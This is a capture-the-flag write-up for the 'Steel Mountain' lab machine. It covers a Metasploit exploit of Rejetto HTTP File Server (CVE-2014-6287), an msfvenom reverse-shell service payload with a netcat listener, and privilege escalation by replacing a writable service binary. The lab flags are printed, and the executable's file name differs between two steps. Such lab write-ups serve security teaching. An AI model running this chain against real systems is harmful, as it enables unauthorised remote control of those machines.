# Steel Mountain

### Introduction
- Who is the employee of the month? <br />
Let's begin with a basic nmap scan: 

      nmap 10.10.66.98
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 13:41 CEST
      Nmap scan report for 10.10.66.98
      Host is up (0.044s latency).
      Not shown: 989 closed tcp ports (conn-refused)
      PORT      STATE SERVICE
      80/tcp    open  http
      135/tcp   open  msrpc
      139/tcp   open  netbios-ssn
      445/tcp   open  microsoft-ds
      3389/tcp  open  ms-wbt-server
      8080/tcp  open  http-proxy
      49152/tcp open  unknown
      49153/tcp open  unknown
      49154/tcp open  unknown
      49155/tcp open  unknown
      49156/tcp open  unknown

Since port 80 is open, let's first take a look at the website: <br />
![image](https://github.com/user-attachments/assets/1363ebde-4608-4414-91dc-a2c3777c3069) <br />
Usually the first thing I do when enumerating a web site is to look at the page source code to see if any useful info or comments has been left by developers. Indeed we can see the name of the image which gives us the answer: <br />
![image](https://github.com/user-attachments/assets/7f0f9011-186e-4402-94af-e3ad82e3a852)<br />
`Bill Harper`


### Initial Access
- Scan the machine with nmap. What is the other port running a web server on? `8080`
- Take a look at the other web server. What file server is running? <br />
![image](https://github.com/user-attachments/assets/7773fa8e-fef1-4f33-b016-20f079446688)<br />
![image](https://github.com/user-attachments/assets/d939024c-59f7-4833-b055-3bac268ff674)<br />
`Rejetto HTTP File Server`
- What is the CVE number to exploit this file server?<br />
Reaserch "HttpFileServer httpd 2.3" to get the answer: `2014-6287`
- Use Metasploit to get an initial shell. What is the user flag? <br />
Run `msfconsole` to open metasploit. Now search for an exploit that can help us: `search HttpFileServer`: <br />
![image](https://github.com/user-attachments/assets/73500e1d-9267-4369-9736-b0941b2daa5c)<br />
We're going to use this exploit, so lets set the options: `set RHOSTS 10.10.66.98` --> `set LHOST your_IP` --> `set RPORT 8080` and we have our beautiful meterpreter session: <br />
![image](https://github.com/user-attachments/assets/a8ee8d6b-a281-41d1-9782-ade94c564e0e)<br />
Now I run `search -f user.txt` to find the flag: <br />
![image](https://github.com/user-attachments/assets/1f463ae0-59e0-41c9-b1a3-48252a2b0c79)<br />
The flag is `b04763b6fcf51fcd7c13abc7db4fd365`

### Privilege Escalation
To enumerate this windows machine, we are going to use [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) which is able to detect common Windows privilege escalation vectors that rely on misconfigurations. I'm running Kali, so I already have installed by deafault at `/usr/share/wondows-resources/powersploit/Privesc/PowerUp.ps1`. 
To upload it on meterpreter, run `upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1` <br/> 
![image](https://github.com/user-attachments/assets/44142125-6f76-4382-856c-db6ca3a7549d)<br />
To run a powershell script, we need to open powershell. From meterpreter, run `load powershell` --> ` powershell_shell`. Now to run it: 

      PS > . .\PowerUp.ps1
      PS > Invoke-AllChecks
![image](https://github.com/user-attachments/assets/17e137cb-02fe-4101-9786-3bd1b910b1c8)<br />
The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! <br />
So now the idea is to create a reverse shell for windows, replace this executable with our reverse shell, and restart the service to run the reverse shell. <br />
To create a reverse shell we're going to use msfvenom: `msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`. Now upload it to meterpreter using the `upload` command we used before. Now from your kali machine, open a netcat listener `nc -lnvp 4443`. Then go back to powershell and run: 

      PS > Stop-Service -Name AdvancedSystemCareService9
      PS > copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"     
      PS > Restart-Service -Name AdvancedSystemCareService9

![image](https://github.com/user-attachments/assets/0f1e3265-7c55-4b5b-94ee-51c1bbaf43fe)<br />
Now let's move to the administrator desktop to find the root flag: <br />
![image](https://github.com/user-attachments/assets/ac2a7a3e-ca2a-4b73-8136-780f66cf11ae)

    
- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability? `AdvancedSystemCareService9`
- What is the root flag? `9af5f314f57607c00fd09803a587db80`

### Access and Escalation Without Metasploit
- What powershell -c command could we run to manually find out the service name? *Format is "powershell -c "command here"* `powershell -c "Get-Service"`
